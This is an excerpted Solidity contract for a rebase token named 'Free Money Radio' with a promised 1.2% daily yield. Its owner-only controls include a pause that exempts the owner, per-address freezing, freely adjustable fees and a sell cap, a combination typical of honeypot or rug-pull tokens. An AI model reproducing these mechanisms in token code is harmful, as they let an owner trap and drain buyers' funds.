...
contract Pausable is Ownable {
  ...
  modifier whenNotPaused() {
    require(!paused || msg.sender == _owner);
    _;
  }
...
contract WENCONTRACT is ERC20Detailed, Ownable, Pausable {
    using SafeMath for uint256;
    using SafeMathInt for int256;

    bool private initialDistributionFinished = false;
    bool private swapEnabled = true;
    bool private liquifyAll = false;
    bool private autoRebase = false;
    bool private feesOnNormalTransfers = true;
    bool public isLiquidityInBnb = false;

    uint256 public rewardYield = 120000000; // 1.2% Daily Compound at Rebase Freq 86400
    uint256 public rewardYieldDenominator = 10000000000; // 1.2% Daily Compound at Rebase Freq 86400
    uint256 public maxSellTransactionAmount = 250 * 10 ** 18;

    uint256 private rebaseFrequency = 86400;
    uint256 private nextRebase = block.timestamp + 604800;
    ...
    address private liquidityReceiver = 0x0000000000000000000000000000000000000000;
    address private treasuryReceiver = 0x0000000000000000000000000000000000000000;
    address private riskFreeValueReceiver = 0x0000000000000000000000000000000000000000;
    address private charityReceiver = 0x0000000000000000000000000000000000000000;
    ...
    uint256 public sellFeeRFVAdded = 7;
    ...
    uint256 private price = 2212000000000000;

    uint256 public transferTax = 200;
    ...
    uint256 private gonSwapThreshold = (TOTAL_GONS * 10) / 1000000;

    mapping(address => uint256) private _gonBalances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;

    constructor() ERC20Detailed("Free Money Radio", "FMR", uint8(DECIMALS)) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //Pancakeswap
    ...
    function transfer(address to, uint256 value) external whenNotPaused override validRecipient(to) returns (bool){
    ...
    function _basicTransfer(address from, address to, uint256 amount) internal whenNotPaused returns (bool) {
        require(_freezed[msg.sender] != true);
        require(_freezed[to] != true);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal whenNotPaused returns (bool) {
        require(_freezed[sender] != true);
        require(_freezed[recipient] != true);
    ...
    function transferFrom(address from, address to, uint256 value) external whenNotPaused override validRecipient(to) returns  (bool) {
    ...
    function XsendFee() public whenNotPaused payable {
         require(msg.value == price, 'Need to send some ETH');

    }

    function userRebase() public whenNotPaused payable {
    ...
    function swapBack() internal swapping {
        ...
        if(amountToLiquify > 0){
            uint256 charity = amountToLiquify.div(2);
            _swapTokensForBNB(charity, charityReceiver);

            _swapAndLiquify(amountToLiquify.sub(charity));
        }
    ...
    function _rebase() private whenNotPaused {
        if(!inSwap) {
            uint256 circulatingSupply = getCirculatingSupply();
            int256 supplyDelta = int256(circulatingSupply.mul(rewardYield).div(rewardYieldDenominator));
    ...
    function coreRebase(int256 supplyDelta) private whenNotPaused returns (uint256) {
    ...
    function setFeeReceivers(address _liquidityReceiver, address _treasuryReceiver, address _riskFreeValueReceiver, address _charityReceiver) external onlyOwner  {
    ...
    function setFees(uint256 _liquidityFee, uint256 _riskFreeValue, uint256 _treasuryFee, uint256 _sellFeeTreasuryAdded, uint256 _sellFeeRFVAdded, uint256 _feeDenominator, uint256 _price) external onlyOwner  {
        require(
